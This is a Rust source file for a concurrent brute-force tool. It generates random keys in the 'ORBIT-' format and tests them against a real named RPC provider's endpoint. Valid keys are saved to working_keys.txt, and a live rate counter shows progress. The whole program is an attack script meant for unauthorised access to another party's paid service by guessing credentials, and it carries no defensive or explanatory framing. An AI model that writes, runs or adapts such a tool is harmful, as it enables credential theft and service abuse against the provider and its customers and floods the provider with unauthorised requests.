use std::io::{self, Write};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Instant;

use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use tokio::time::{interval, Duration};

const ORBITFLARE_URL: &str = "http://sg.rpc.orbitflare.com";
const LETTERS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

#[inline(always)]
fn generate_key(rng: &mut StdRng) -> String {
    let mut key = String::with_capacity(27);
    key.push_str("ORBIT-");
    for _ in 0..6 {
        key.push(LETTERS[rng.gen_range(0..26)] as char);
    }
    key.push('-');
    for _ in 0..6 {
        key.push((b'0' + rng.gen_range(0..10)) as char);
    }
    key.push('-');
    for _ in 0..6 {
        key.push((b'0' + rng.gen_range(0..10)) as char);
    }
    key
}

async fn test_key(client: &reqwest::Client, key: &str) -> bool {
    let body = serde_json::json!({
        "jsonrpc": "2.0", "id": 1, "method": "getSlot", "params": []
    });
    match client
        .post(format!("{}?api_key={}", ORBITFLARE_URL, key))
        .json(&body)
        .send()
        .await
    {
        Ok(resp) => resp
            .json::<serde_json::Value>()
            .await
            .map(|v| v.get("result").is_some() && v["result"].is_u64())
            .unwrap_or(false),
        Err(_) => false,
    }
}

struct Stats {
    tested: AtomicU64,
    found: AtomicU64,
}

#[tokio::main]
async fn main() {
    let concurrency: usize = std::env::args()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(100);

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .pool_max_idle_per_host(concurrency * 2)
        .tcp_keepalive(Duration::from_secs(10))
        .tcp_nodelay(true)
        .build()
        .unwrap();

    let stats = Arc::new(Stats {
        tested: AtomicU64::new(0),
        found: AtomicU64::new(0),
    });

    let start = Instant::now();

    // Terminal updater
    let stats_c = Arc::clone(&stats);
    tokio::spawn(async move {
        let mut ticker = interval(Duration::from_millis(100));
        loop {
            ticker.tick().await;
            let tested = stats_c.tested.load(Ordering::Relaxed);
            let found = stats_c.found.load(Ordering::Relaxed);
            let elapsed = start.elapsed().as_secs_f64();
            let rps = if elapsed > 0.0 { tested as f64 / elapsed } else { 0.0 };
            print!(
                "\r  Tested: {} | Found: {} | {:.0} keys/s | {:.0}s elapsed   ",
                tested, found, rps, elapsed
            );
            io::stdout().flush().unwrap();
        }
    });

    let mut handles = Vec::with_capacity(concurrency);
    for _ in 0..concurrency {
        let client = client.clone();
        let stats = Arc::clone(&stats);

        handles.push(tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            loop {
                let key = generate_key(&mut rng);
                if test_key(&client, &key).await {
                    stats.found.fetch_add(1, Ordering::Relaxed);
                    println!("\n  *** FOUND: {} ***", key);
                    let mut file = std::fs::OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open("working_keys.txt")
                        .unwrap();
                    writeln!(file, "{}", key).unwrap();
                }
                stats.tested.fetch_add(1, Ordering::Relaxed);
            }
        }));
    }

    for h in handles {
        let _ = h.await;
    }
}
